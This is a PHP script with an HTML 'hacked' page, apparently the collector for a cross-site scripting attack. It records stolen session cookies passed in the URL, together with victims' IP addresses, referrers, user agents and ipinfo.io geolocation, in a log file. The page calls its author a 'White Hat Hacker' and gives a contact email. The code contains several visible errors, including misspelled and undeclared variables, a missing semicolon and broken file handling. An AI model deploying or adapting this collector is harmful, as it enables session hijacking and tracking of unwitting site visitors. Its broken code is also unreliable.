<?php
$cookie="[+] victim Cookie ==> [ ' ".$_GET['cookie']." ]";
$ip="[+] victim IP ==> [ ' ".$_SERVER['REMOTE_ADDR']." ]";
$ref="[+] victim Comes From ==> [ ' ".$_SERVER['HTTP_REFERER']." ]";
$uAgent="[+] victim Details ==> [ ' ".$_SERVER['HTTP_USER_AGENT']." ]";
$sName="[+] Server Name ==> [ ' ".$_SERVER['SERVER_NAME']." ]";
$sIP="[+] Server IP ==> [ ' ".$_SERVER['SERVER_ADDR']." ]";
function get_client_ip()
{
	$ipaddress='';
	if(isset($_SERVER['HTTP_CLIENT_IP']))
	{
		$ipaddress=$_SERVER['HTTP_CLIENT_IP'];
	}
	else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ipaddress=$_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	else if(isset($_SERVER['HTTP_X_FORWARDED']))
	{
		$ipaddress=$_SERVER['HTTP_X_FORWARDED'];
	}
	else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
	{
		$ipaddress=$_SERVER['HTTP_FORWARDED_FOR'];
	}
	else if(isset($_SERVER['HTTP_FORWARDED']))
	{
		$ipaddress=$_SERVER['HTTP_FORWARDED'];
	}
	else if(isset($_SERVER['REMOTE_ADDR']))
	{
		$ipaddress=$_SERVER['REMOTE_ADDR'];
	}
	else{
	}	$ipaddress='UNKNOWN';
     	return $ipaddress;	
}
$PuplicIP=get_client_ip();
$json=file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json=json_decode($json,true);
$country="USER COUNTRY IS  ==>".json['country'];
$region="USER REGION IS ==> ".json['region'];
$city="USER CITY IS ==> ".json['city'];
$all="\n.....{Begin}.....\n".$cookie."\n\n".$ip."\n\n".$ref ."\n\n".$uAgent."\n\n".$sName."\n\n".sIP."\n\n".".....{LOCATION}....."."\n\n".$country."\n".$region."\n".$city."\n\n".".......{END}......"

$handle=fopen('log.txt','a');
fwrite($handle,$all);
fclose=($handle);

?>


<!DOCTYPE html>
<html>
<head>
<meta charset='UTF-8'/>
<meta name='description'  content='hacked_site'/>
<meta name='viewport' content='width=device.width,initial-scale=1.0' />
<title>hacked</title>
</head>

<body style="background-color:black;">
<center>
<h1><p style="color:red"><b>Welcome</b></p></h1>
<h2><p style="color:orange"><b>You Have A Bug In Your Site</b></p></h2>
<h2><p style="color:white"><b>Hi Im White Hat Hacker and Welcome in my web site</b></p></h2>
<h2><p style="color:yellow"><b>TO contact me Please mail at :-</b></p></h2>
<p style="color:blue">{{mos693570@gmail.com}}</p>
<br><br>
</center>
</body>
</html>




